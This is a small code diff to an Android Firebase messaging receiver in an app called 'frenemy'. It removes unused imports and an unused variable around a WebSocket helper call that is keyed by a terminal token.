@@ -4,9 +4,7 @@ import android.util.Log;
 
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
-import com.theah64.frenemy.android.models.SocketMessage;
 import com.theah64.frenemy.android.utils.APIRequestGateway;
-import com.theah64.frenemy.android.utils.AdvancedWebSocketClient;
 import com.theah64.frenemy.android.utils.WebSocketHelper;
 
 import java.util.Map;
@@ -29,7 +27,7 @@ public class FCMReceiver extends FirebaseMessagingService {
             new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                 @Override
                 public void onReadyToRequest(String apiKey, String frenemyId) {
-                    AdvancedWebSocketClient helper = WebSocketHelper.getInstance(FCMReceiver.this).getHelper(terminalToken, apiKey);
+                    WebSocketHelper.getInstance(FCMReceiver.this).getHelper(terminalToken, apiKey);
                 }
 
                 @Override
